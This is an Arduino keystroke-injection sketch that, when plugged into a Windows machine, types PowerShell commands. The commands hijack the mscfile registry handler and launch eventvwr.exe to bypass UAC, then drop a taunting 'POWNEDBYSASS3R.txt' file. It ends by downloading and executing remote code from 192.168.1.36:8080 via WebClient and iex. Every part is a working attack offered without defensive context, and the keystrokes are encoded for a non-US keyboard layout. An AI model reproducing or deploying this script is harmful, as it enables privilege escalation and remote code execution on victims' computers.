#include<HID-Project.h>
void setup(){
  Keyboard.begin();
  delay(10000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.println("powershell.exe");
  delay(500);
  Keyboard.print("New/Item /Path HKCU>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Software");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Classes");
  Keyboard.println(" /Name mscfile");
  delay(100);
  Keyboard.print("New/Item /Path HKCU>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Software");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Classes");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("mscfile");
  Keyboard.println(" /Name shell");
  delay(100);
  Keyboard.print("New/Item /Path HKCU>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Software");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Classes");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("mscfile");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("shell");
  Keyboard.println(" /Name open");
  delay(100);
  Keyboard.print("New/Item /Path HKCU>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Software");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Classes");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("mscfile");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("shell");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("open");
  Keyboard.println(" /Name command");
  delay(100);
  Keyboard.print("Set/ItemProperty /Path HKCU>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Software");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Classes");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("mscfile");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("shell");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("open");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("command");
  Keyboard.print(" /Name @*default(@ /Value -C>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("Windows");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.print("system32");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.println("cmd.exe &c @start powershell@-");
  delay(100);
  Keyboard.println("start eventvwr.exe");
  Keyboard.println("exit");
  delay(700);
  Keyboard.print("New/Item /Path C>");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('`');
  Keyboard.releaseAll();
  Keyboard.println(" /Name POWNEDBYSASS3R.txt /Value -UAC QUACKED JOJO- /Type file");
  delay(300);
  Keyboard.println("$e)new/object net.webclient");
  Keyboard.println("iex $e.downloadstring*-http>&&192.168.1.36>8080&W1Nd0WsP0WN3D-(");
  Keyboard.println("exit");
}

void loop(){}
